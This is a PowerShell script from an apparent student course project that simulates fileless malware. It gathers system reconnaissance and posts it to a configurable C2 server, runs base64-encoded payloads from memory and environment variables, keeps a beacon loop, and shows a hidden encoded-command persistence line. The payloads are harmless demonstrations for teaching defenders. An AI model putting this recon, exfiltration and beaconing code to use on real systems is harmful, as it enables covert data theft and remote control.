<#
.SYNOPSIS
    Fileless Malware Simulation Script
    IT 359 Final Project - Hack the Blocks

.DESCRIPTION
    This PowerShell script simulates fileless malware techniques
    by executing commands entirely in memory without writing to disk.
    
    Techniques demonstrated:
    1. In-memory script execution (no files written to disk)
    2. System reconnaissance gathering
    3. HTTP beaconing to C2 server
    4. Registry-based persistence (fileless)
    5. Environment variable abuse
    
.NOTES
    WARNING: This is for educational purposes only.
    Only use in controlled lab environments with proper authorization.
    
    Authors: Zac Davis, Caleb Clauson
    Course: IT 359 - Spring 2026

.PARAMETER C2Server
    The IP address or hostname of the C2 listener server

.PARAMETER C2Port
    The port number the C2 listener is running on (default: 8080)

.PARAMETER BeaconInterval
    Time in seconds between beacon attempts (default: 30)

.PARAMETER Verbose
    Enable verbose output for demonstration purposes
#>

param(
    [string]$C2Server = "127.0.0.1",
    [int]$C2Port = 8080,
    [int]$BeaconInterval = 30,
    [switch]$DemoMode = $true
)

# ============================================
# CONFIGURATION
# ============================================
$Global:C2Url = "http://${C2Server}:${C2Port}"
$Global:UniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)

# ============================================
# DISPLAY BANNER
# ============================================
function Show-Banner {
    Write-Host ""
    Write-Host "╔══════════════════════════════════════════════════════════╗" -ForegroundColor Red
    Write-Host "║     FILELESS MALWARE SIMULATION - EDUCATIONAL ONLY       ║" -ForegroundColor Red
    Write-Host "║          IT 359 Final Project - Hack the Blocks          ║" -ForegroundColor Red
    Write-Host "╚══════════════════════════════════════════════════════════╝" -ForegroundColor Red
    Write-Host ""
    Write-Host "[!] WARNING: This script is for authorized testing only!" -ForegroundColor Yellow
    Write-Host "[*] Session ID: $Global:UniqueId" -ForegroundColor Cyan
    Write-Host "[*] C2 Server: $Global:C2Url" -ForegroundColor Cyan
    Write-Host ""
}

# ============================================
# TECHNIQUE 1: SYSTEM RECONNAISSANCE
# Gather system info entirely in memory
# ============================================
function Get-SystemRecon {
    Write-Host "[+] Technique 1: In-Memory System Reconnaissance" -ForegroundColor Green
    
    # All data stored in memory, never written to disk
    $recon = @{
        Hostname = $env:COMPUTERNAME
        Username = $env:USERNAME
        Domain = $env:USERDOMAIN
        OS = (Get-CimInstance Win32_OperatingSystem).Caption
        Architecture = $env:PROCESSOR_ARCHITECTURE
        IPAddresses = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne "127.0.0.1" }).IPAddress
        CurrentDirectory = (Get-Location).Path
        PowerShellVersion = $PSVersionTable.PSVersion.ToString()
        IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
        Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
        SessionId = $Global:UniqueId
    }
    
    if ($DemoMode) {
        Write-Host "    [*] Gathered system information:" -ForegroundColor Gray
        Write-Host "        - Hostname: $($recon.Hostname)" -ForegroundColor Gray
        Write-Host "        - Username: $($recon.Username)" -ForegroundColor Gray
        Write-Host "        - OS: $($recon.OS)" -ForegroundColor Gray
        Write-Host "        - Admin: $($recon.IsAdmin)" -ForegroundColor Gray
    }
    
    return $recon
}

# ============================================
# TECHNIQUE 2: HTTP BEACON TO C2
# Send data to C2 server without writing files
# ============================================
function Send-Beacon {
    param(
        [hashtable]$Data,
        [string]$Endpoint = "/beacon"
    )
    
    Write-Host "[+] Technique 2: HTTP Beacon to C2 Server" -ForegroundColor Green
    
    try {
        # Convert data to JSON in memory
        $jsonData = $Data | ConvertTo-Json -Compress
        
        if ($DemoMode) {
            Write-Host "    [*] Preparing beacon to: $Global:C2Url$Endpoint" -ForegroundColor Gray
            Write-Host "    [*] Payload size: $($jsonData.Length) bytes" -ForegroundColor Gray
        }
        
        # Send HTTP POST request (data never touches disk)
        $response = Invoke-RestMethod -Uri "$Global:C2Url$Endpoint" `
                                      -Method POST `
                                      -Body $jsonData `
                                      -ContentType "application/json" `
                                      -ErrorAction Stop
        
        Write-Host "    [✓] Beacon sent successfully!" -ForegroundColor Green
        return $response
    }
    catch {
        if ($DemoMode) {
            Write-Host "    [!] Beacon failed (C2 server not running?): $($_.Exception.Message)" -ForegroundColor Yellow
        }
        return $null
    }
}

# ============================================
# TECHNIQUE 3: IN-MEMORY CODE EXECUTION
# Execute code from string without file
# ============================================
function Invoke-MemoryExecution {
    Write-Host "[+] Technique 3: In-Memory Code Execution" -ForegroundColor Green
    
    # Code stored as string, executed via Invoke-Expression
    # This is how fileless malware often downloads and runs payloads
    $inMemoryScript = @'
    $result = @{
        Technique = "In-Memory Execution"
        ProcessId = $PID
        ExecutionTime = Get-Date -Format "HH:mm:ss"
        Note = "This code was never written to disk"
    }
    return $result
'@
    
    if ($DemoMode) {
        Write-Host "    [*] Executing script block from memory..." -ForegroundColor Gray
        Write-Host "    [*] Script never touches disk - runs directly from RAM" -ForegroundColor Gray
    }
    
    # Execute the in-memory script
    $scriptBlock = [ScriptBlock]::Create($inMemoryScript)
    $result = & $scriptBlock
    
    if ($DemoMode) {
        Write-Host "    [✓] In-memory execution completed (PID: $($result.ProcessId))" -ForegroundColor Green
    }
    
    return $result
}

# ============================================
# TECHNIQUE 4: ENVIRONMENT VARIABLE ABUSE
# Store payload in env vars (no files)
# ============================================
function Set-EnvPayload {
    Write-Host "[+] Technique 4: Environment Variable Payload Storage" -ForegroundColor Green
    
    # Encode a payload and store in environment variable
    $payload = "Write-Host 'Payload executed from environment variable!' -ForegroundColor Magenta"
    $encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
    
    # Store in environment variable (process-level, not persistent)
    [Environment]::SetEnvironmentVariable("DEMO_PAYLOAD", $encodedPayload, "Process")
    
    if ($DemoMode) {
        Write-Host "    [*] Payload stored in env var: DEMO_PAYLOAD" -ForegroundColor Gray
        Write-Host "    [*] Encoded payload length: $($encodedPayload.Length) chars" -ForegroundColor Gray
    }
    
    # Retrieve and execute
    $retrieved = [Environment]::GetEnvironmentVariable("DEMO_PAYLOAD", "Process")
    $decoded = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($retrieved))
    
    if ($DemoMode) {
        Write-Host "    [*] Executing payload from environment variable..." -ForegroundColor Gray
        Invoke-Expression $decoded
    }
    
    # Clean up
    [Environment]::SetEnvironmentVariable("DEMO_PAYLOAD", $null, "Process")
    Write-Host "    [✓] Environment variable cleaned up" -ForegroundColor Green
}

# ============================================
# TECHNIQUE 5: REGISTRY RUN KEY (DEMO ONLY)
# Shows how persistence can be fileless
# ============================================
function Show-RegistryPersistence {
    Write-Host "[+] Technique 5: Registry-Based Persistence (DEMO ONLY - Not Executed)" -ForegroundColor Green
    
    if ($DemoMode) {
        Write-Host "    [*] Fileless malware often uses registry for persistence:" -ForegroundColor Gray
        Write-Host "    [*] Location: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -ForegroundColor Gray
        Write-Host "    [*] Value: PowerShell encoded command that runs on startup" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    [DEMO] Example command that WOULD be used (not executed):" -ForegroundColor Yellow
        
        $demoCommand = 'powershell -NoP -W Hidden -Enc <base64_payload>'
        Write-Host "    $demoCommand" -ForegroundColor DarkGray
        Write-Host ""
        Write-Host "    [!] This technique is shown for education only - not executed" -ForegroundColor Yellow
    }
}

# ============================================
# TECHNIQUE 6: WMI EVENT SUBSCRIPTION (DEMO)
# Another fileless persistence method
# ============================================
function Show-WMIPersistence {
    Write-Host "[+] Technique 6: WMI Event Subscription (DEMO ONLY - Not Executed)" -ForegroundColor Green
    
    if ($DemoMode) {
        Write-Host "    [*] WMI subscriptions allow code execution without files:" -ForegroundColor Gray
        Write-Host "    [*] - Event Filter: Defines trigger condition" -ForegroundColor Gray
        Write-Host "    [*] - Event Consumer: Defines action (PowerShell command)" -ForegroundColor Gray
        Write-Host "    [*] - Binding: Links filter to consumer" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    [!] This is a detection target for Blue Team!" -ForegroundColor Yellow
    }
}

# ============================================
# TECHNIQUE 7: PROCESS HOLLOWING CONCEPT
# ============================================
function Show-ProcessHollowing {
    Write-Host "[+] Technique 7: Process Hollowing Concept (Educational)" -ForegroundColor Green
    
    if ($DemoMode) {
        Write-Host "    [*] Process hollowing injects code into legitimate processes:" -ForegroundColor Gray
        Write-Host "    [*] 1. Start suspended legitimate process (e.g., svchost.exe)" -ForegroundColor Gray
        Write-Host "    [*] 2. Unmap/hollow out its memory" -ForegroundColor Gray
        Write-Host "    [*] 3. Inject malicious code" -ForegroundColor Gray
        Write-Host "    [*] 4. Resume process - appears legitimate to monitoring" -ForegroundColor Gray
        Write-Host ""
        Write-Host "    [!] Requires Windows API calls - shown conceptually only" -ForegroundColor Yellow
    }
}

# ============================================
# CONTINUOUS BEACON LOOP
# ============================================
function Start-BeaconLoop {
    param([int]$Interval = 30)
    
    Write-Host ""
    Write-Host "[*] Starting beacon loop (Interval: ${Interval}s, Ctrl+C to stop)" -ForegroundColor Cyan
    Write-Host ""
    
    $iteration = 0
    while ($true) {
        $iteration++
        Write-Host "[Beacon $iteration] $(Get-Date -Format 'HH:mm:ss')" -ForegroundColor DarkCyan
        
        $beaconData = @{
            SessionId = $Global:UniqueId
            Iteration = $iteration
            Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
            Status = "Active"
        }
        
        $response = Send-Beacon -Data $beaconData -Endpoint "/heartbeat"
        
        if ($response -and $response.command) {
            Write-Host "    [!] Received command from C2: $($response.command)" -ForegroundColor Magenta
            # In real malware, commands would be executed here
        }
        
        Start-Sleep -Seconds $Interval
    }
}

# ============================================
# MAIN EXECUTION
# ============================================
function Start-Simulation {
    Clear-Host
    Show-Banner
    
    Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor DarkGray
    Write-Host " DEMONSTRATING FILELESS MALWARE TECHNIQUES" -ForegroundColor White
    Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor DarkGray
    Write-Host ""
    
    # Technique 1: Gather recon data in memory
    $reconData = Get-SystemRecon
    Write-Host ""
    
    # Technique 2: Beacon to C2
    Send-Beacon -Data $reconData -Endpoint "/register"
    Write-Host ""
    
    # Technique 3: In-memory code execution
    $execResult = Invoke-MemoryExecution
    Write-Host ""
    
    # Technique 4: Environment variable abuse
    Set-EnvPayload
    Write-Host ""
    
    # Technique 5: Registry persistence (demo only)
    Show-RegistryPersistence
    Write-Host ""
    
    # Technique 6: WMI persistence (demo only)
    Show-WMIPersistence
    Write-Host ""
    
    # Technique 7: Process hollowing concept
    Show-ProcessHollowing
    Write-Host ""
    
    Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor DarkGray
    Write-Host " SIMULATION COMPLETE" -ForegroundColor White
    Write-Host "═══════════════════════════════════════════════════════════" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "[*] All techniques demonstrated in memory - no files written!" -ForegroundColor Cyan
    Write-Host "[*] To start continuous beaconing, run: Start-BeaconLoop" -ForegroundColor Cyan
    Write-Host ""
}

# Run the simulation
Start-Simulation
